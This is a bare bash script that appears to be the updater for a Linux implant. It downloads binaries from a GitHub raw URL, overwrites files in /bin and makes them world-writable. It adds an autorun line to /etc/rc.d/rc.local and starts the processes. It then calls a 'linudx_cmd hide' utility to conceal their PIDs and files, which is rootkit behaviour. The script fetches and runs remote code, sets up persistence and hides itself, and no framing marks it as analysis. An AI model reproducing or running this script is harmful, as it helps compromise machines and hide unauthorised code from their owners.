#!/bin/bash
#
#down and checkmd5
wget https://raw.githubusercontent.com/myvulweb/b3/master/linudxd -O /tmp/alinudxd
wget https://raw.githubusercontent.com/myvulweb/b3/master/linudxt -O /tmp/alinudxt
wget https://raw.githubusercontent.com/myvulweb/b3/master/linudx-home -O /tmp/alinudx-home
wget https://raw.githubusercontent.com/myvulweb/b3/master/linudx-ver.txt -O /tmp/alinudx-ver.txt
wget https://raw.githubusercontent.com/myvulweb/b3/master/linudx-update.sh -O /tmp/alinudx-update.sh
wget https://raw.githubusercontent.com/myvulweb/b3/master/linudx-startup.sh -O /tmp/alinudx-startup.sh
wget https://raw.githubusercontent.com/myvulweb/b3/master/md5 -O /tmp/mymd5

check1=`cat /tmp/mymd5 | grep \`md5sum /tmp/alinudxt | cut -d " " -f1\``
check2=`cat /tmp/mymd5 | grep \`md5sum /tmp/alinudxd | cut -d " " -f1\``
check3=`cat /tmp/mymd5 | grep \`md5sum /tmp/alinudx-home | cut -d " " -f1\``
check4=`cat /tmp/mymd5 | grep \`md5sum /tmp/alinudx-ver.txt | cut -d " " -f1\``


rm -rf /tmp/mymd5

if [[ "$check1" = "" || "$check2" = "" || "$check3" = "" || "$check4" = "" ]]
then
  echo "check1"
  echo $check1
  echo "check2"
  echo $check2
  echo "check3"
  echo $check3
  echo "check4"
  echo $check4
  echo "down error!"
  exit 2
fi

#uninstall start
sed -i '\/bin\/linudx-startup.sh/d' /etc/rc.d/rc.local

#kill -9 `cat /bin/linudx-pids`
/linudx/linudx_cmd show

if [ "`pidof linudxd`" ];then
  echo "show linudxd success check one"
else
  /linudx/linudx_cmd show
fi

if [ "`pidof linudxd`" ];then
  echo "show linudxd success check two" 
else
  echo "show linudxd failed"
fi
  
killall linudxd
killall linudxt
killall linudx-home

rm -rf /bin/linudxd
rm -rf /bin/linudxt
rm -rf /bin/linudx-home
rm -rf /bin/linudx-update.sh
rm -rf /bin/linudx-ver.txt
rm -rf /bin/linudx-startup.sh
#uninstall finish

#copy files to /bin
mv /tmp/alinudxd /bin/linudxd
mv /tmp/alinudxt /bin/linudxt
mv /tmp/alinudx-home /bin/linudx-home
mv /tmp/alinudx-update.sh /bin/linudx-update.sh
mv /tmp/alinudx-startup.sh /bin/linudx-startup.sh
mv /tmp/alinudx-ver.txt /bin/linudx-ver.txt

#add autorun for centos

echo '/bin/linudx-startup.sh'>>/etc/rc.d/rc.local

chmod 777 /bin/linudxd
chmod 777 /bin/linudxt
chmod 777 /bin/linudx-home
chmod 777 /bin/linudx-update.sh
chmod 777 /bin/linudx-startup.sh

/bin/linudxd &
/bin/linudxt &
/bin/linudx-home &

p1=`pidof linudxd`
p2=`pidof linudxt`
p3=`pidof linudx-home`

#hide pid and files
/linudx/linudx_cmd hide $p1
/linudx/linudx_cmd hide $p2
/linudx/linudx_cmd hide $p3

if [ "`pidof linudxd`" ];then
  /linudx/linudx_cmd hide   
else
  echo "hide success one"
fi

if [ "`pidof linudxd`" ];then
  echo "hide failed"
else
  echo "hide success two" 
fi
sleep 1
#echo "$p1 $p2 $p3" > /bin/linudx-pids